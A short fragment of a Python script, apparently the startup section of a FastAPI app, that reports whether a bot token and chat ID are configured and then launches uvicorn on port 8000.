    print(f"Bot Token     : {'SET' if BOT_TOKEN else 'NOT SET'}")
    print(f"Chat ID       : {'SET' if CHAT_ID else 'NOT SET'}")
    print("=" * 50)
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
